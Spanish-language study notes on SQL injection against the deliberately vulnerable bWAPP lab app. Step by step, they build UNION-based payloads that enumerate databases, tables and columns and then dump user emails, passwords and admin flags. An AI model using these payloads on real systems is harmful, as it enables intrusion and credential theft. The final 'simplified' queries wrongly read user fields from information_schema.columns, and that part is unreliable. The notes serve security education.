[[Home]]/[[CETI]]/[[Puesta en producción segura]]
# SQLi
## `' or 1=1 -- -`

```SQL
/*# Original*/
SELECT * FROM movies WHERE movie = '$movie';

/*
Muestra toda la información de las filas (*) de la tabla "movies" donde el campo "movie" sea el campo introducido por el usuario.
*/

/*Resultado*/
SELECT * FROM movies WHERE movie = '' or 1=1 -- -';

/*
Muestra toda la información de las filas (*) de la tabla "movies" donde el campo "movie" sea "" o 1=1.

El primer apóstrofe cierra la string.

"or 1=1" añade una condición que siempre es cierta para mostrar todas las filas de la tabla.

"-- -" comenta el resto de la sentencia original

Esta SQLi muestra todas las filas de una tabla.
*/

/*Resultado simplificado*/
SELECT * FROM movies WHERE movie = '' or 1=1;
```

![[Pasted image 20250128132339.png]]
## `' union select 1,2,3,4,5,6,7 -- -`


```SQL
/*# Original*/
SELECT * FROM movies WHERE movie = '$movie';

/*
Muestra toda la información de las filas (*) de la tabla "movies" donde el campo "movie" sea el campo introducido por el usuario.
*/

/*Resultado*/
SELECT * FROM movies WHERE movie = '' union select 1,2,3,4,5,6,7 -- -';

/*
Muestra toda la información de las filas (*) de la tabla "movies" donde el campo "movie" sea ""

Y (union)

Muestra "1" en la primera columna, "2" en la segunda, y así hasta la séptima. Esta inyección solo funciona si se tienen el número exacto de columnas de la tabla, por lo que, si no se conoce la cantidad de columnas en una tabla, se deberán ir introduciendo datos de uno en uno hasta conseguir una query que no acabe en error.

En la web se muestran las columnas 2 a 5 en el siguiente orden: 2,3,5,4.

Esta SQLi permite conocer el número de columnas que tiene una tabla y la manera en la que se muestran.
*/

/*Resultado simplificado*/
SELECT * FROM movies WHERE movie = '' union select 1,2,3,4,5,6,7;

```

![[Pasted image 20250128132415.png]]
## `' union select 1,DATABASE,3,4,5,6,7 -- -`

```SQL
/*# Original*/
SELECT * FROM movies WHERE movie = '$movie';

/*
Muestra toda la información de las filas (*) de la tabla "movies" donde el campo "movie" sea el campo introducido por el usuario.
*/

/*Resultado*/
SELECT * FROM movies WHERE movie = '' union select 1,DATABASE(),3,4,5,6,7 -- -';

/*
Muestra toda la información de las filas (*) de la tabla "movies" donde el campo "movie" sea ""

Y (union)

Llama a la función "DATABASE()", que devuelve el nombre de la base de datos actual. Lo muestra en la segunda columna.

Esta SQLi muestra el nombre de la base de datos actual.
*/

/*Resultado simplificado*/
SELECT * FROM movies WHERE movie = '' union select 1,DATABASE(),3,4,5,6,7;

```

![[Pasted image 20250128132440.png]]

## `' and 1=0 union all select 1, table_schema, table_name,4,5,6,7 from information_schema.tables where table_schema != 'mysql' and table_schema!='information_schema' -- -
`
```SQL
/*# Original*/
SELECT * FROM movies WHERE movie = '$movie';

/*
Muestra toda la información de las filas (*) de la tabla "movies" donde el campo "movie" sea el campo introducido por el usuario.
*/

/*Resultado*/
SELECT * FROM movies WHERE movie = '' AND 1=0 UNION ALL SELECT 1, table_schema, table_name, 4, 5, 6, 7 FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema' -- -';

/*
"and 1=0" hace que no se muestre la primera parte de la queary

Y (union all)

Muestra en la primera columna "1", en la segunda el nombre de la base de datos (table_schema), en la tercera el nombre de la tabla (table_name) y de la cuarta a la séptima los número del "4" al "7".
La información se extrae de la tabla "tables" en la base de datos "information_schema" (information_schema.tables), que contiene metadatos sobre todas las tablas del servidor.
Solo muestra información de las bases de datos que no son "mysql" y "information_schema", que son bases de datos del sistema que no aportan información útil en este caso.

Esta SQLi muestra las bases de datos del servidor y las tablas que contiene cada base de datos.
*/

/*Resultado simplificado*/
SELECT 1, table_schema, table_name, 4, 5, 6, 7 FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema';
```

![[Pasted image 20250128132840.png]]


## `' and 1=0 union all select 1,table_name, column_name,4,5,6,7 from information_schema.columns where table_schema='bwapp' and table_name='users' -- -`

```SQL
/*# Original*/
SELECT * FROM movies WHERE movie = '$movie';

/*
Muestra toda la información de las filas (*) de la tabla "movies" donde el campo "movie" sea el campo introducido por el usuario.
*/

/*Resultado*/
SELECT * FROM movies WHERE movie = '' and 1=0 union all select 1,table_name, column_name,4,5,6,7 from information_schema.columns where table_schema='bwapp' and table_name='users' -- -';

/*
"and 1=0" hace que no se muestre la primera parte de la queary

Y (union all)

Muestra en la primera columna "1", en la segunda el nombre de la tabla (table_name), en la tercera el nombre de cada columna (table_name) y de la cuarta a la séptima los número del "4" al "7".
La información se extrae de la tabla "columns" en la base de datos "information_schema" (information_schema.columns), que contiene metadatos sobre todas las columnas de las tablas del servidor.
Muestra información de la tabla "users" de la base de datos "bwapp".

Esta SQLi muestra las columnas de una tabla en una base de datos específica.
*/

/*Resultado simplificado*/
SELECT 1,table_name,column_name,4,5,6,7 FROM information_schema.columns WHERE table_schema='bwapp' AND table_name='users';
```

![[Pasted image 20250128134727.png]]

## `' and 1=0 union all select 1, email, password, secret, login, admin, 7 from bwapp.users-- -`

```SQL
/*# Original*/
SELECT * FROM movies WHERE movie = '$movie';

/*
Muestra toda la información de las filas (*) de la tabla "movies" donde el campo "movie" sea el campo introducido por el usuario.
*/

/*Resultado*/
SELECT * FROM movies WHERE movie = '' and 1=0 union all select 1, email, password, secret, login, admin, 7 from bwapp.users-- -';

SELECT * FROM movies WHERE movie = '' and 1=0 union all select 1, email, password, login, admin, 6, 7 from bwapp.users-- -';
/*
"and 1=0" hace que no se muestre la primera parte de la queary

Y (union all)

Muestra en la primera columna "1", en la segunda el campo "email", en la tercera el campo "password", en la cuarta el el campo "secret", en la quinta el campo "login", en la sexta el campo "admin" y en la séptima "7".
En este caso, sabiendo que solo se muestran en la web las columnas 2 a 5, el campo "admin" no se verá reflejado en la web. Si se quisiera mostrar "admin", se debería cambiar por alguno de los campos que se muestran de la columna 2 a la 5.
Con este fin, se elimina el campo "secret" de la queary y se incluye "6" en la que es ahora la sexta columna.
La información se extrae de la tabla "users" en la base de datos "bwapp" (bwapp.users).

Muestra los campos solicitados de la tabla "users" de la base de datos "bwapp".
*/

/*Resultado simplificado*/
SELECT 1,email,password,secret,login,admin,7 FROM information_schema.columns WHERE table_schema='bwapp' AND table_name='users';

SELECT 1,email,password,login,admin,6,7 FROM information_schema.columns WHERE table_schema='bwapp' AND table_name='users';
```

![[Pasted image 20250128141828.png]]

![[Pasted image 20250128143542.png]]
